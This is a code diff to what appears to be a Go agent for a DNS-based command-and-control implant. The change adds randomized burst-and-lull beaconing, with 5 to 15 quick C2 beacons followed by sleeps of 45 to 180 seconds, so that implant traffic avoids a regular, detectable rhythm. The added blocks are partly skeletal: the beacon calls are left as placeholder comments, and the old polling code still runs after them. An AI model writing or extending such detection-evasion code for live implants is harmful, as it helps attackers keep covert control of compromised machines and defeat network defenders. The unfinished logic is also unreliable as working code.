@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"strings"
 	"time"
+    "math/rand"
 
 	"github.com/miekg/dns"
 	"github.com/rs/zerolog/log"
@@ -19,6 +20,7 @@ import (
 	"github.com/spf13/cobra"
 )
 
+var currentState = "BURST" // Start in a BURST state
 var agentCmdAgentName string
 var agentCmdAgentPoll int
 
@@ -55,7 +57,46 @@ Example:
 
 		for {
 			// Wait for the next poll!
-			time.Sleep(time.Second * time.Duration(agentCmdAgentPoll))
+			if currentState == "LULL" {
+			        // --- LULL STATE LOGIC ---
+			        // 1. Sleep for a long time (e.g., 45-180 seconds)
+			        lullDuration := time.Duration(45 + rand.Intn(135)) * time.Second
+			        log.Debug().Str("duration", lullDuration.String()).Msg("entering long sleep")
+			        time.Sleep(lullDuration)
+			        
+			        // 2. Send one C2 beacon after the long sleep
+			        // (The existing beaconing code from the original loop goes here)
+			        log.Debug().Msg("sending single beacon after lull")
+			        // ... pollDomain := ...
+			        // ... response := client.Lookup(...) ...
+			        // ... handle the response ...
+
+			        // 3. Switch to the BURST state for the next cycle
+			        currentState = "BURST"
+
+			    } else { // currentState == "BURST"
+			        // --- BURST STATE LOGIC ---
+			        // 1. Decide how many beacons for this burst (e.g., 5-15)
+			        burstCount := 5 + rand.Intn(10)
+			        log.Debug().Int("count", burstCount).Msg("starting burst")
+
+			        // 2. Loop that many times
+			        for i := 0; i < burstCount; i++ {
+			            // 3. Send a C2 beacon
+			            // (The existing beaconing code from the original loop goes here)
+			            log.Debug().Int("current", i+1).Int("total", burstCount).Msg("sending burst beacon")
+			            // ... pollDomain := ...
+			            // ... response := client.Lookup(...) ...
+			            // ... handle the response ...
+
+			            // 4. Sleep for a very short time (e.g., 1-4 seconds)
+			            shortSleep := time.Duration(1 + rand.Intn(4)) * time.Second
+			            time.Sleep(shortSleep)
+			        }
+
+			        // 5. Switch back to the LULL state for the next cycle
+			        currentState = "LULL"
+			    }
 
 			pollDomain := fmt.Sprintf("%x.%s", agentCmdAgentName, options.Domain)
 			log.Debug().Str("poll-domain", pollDomain).Msg("poll domain")
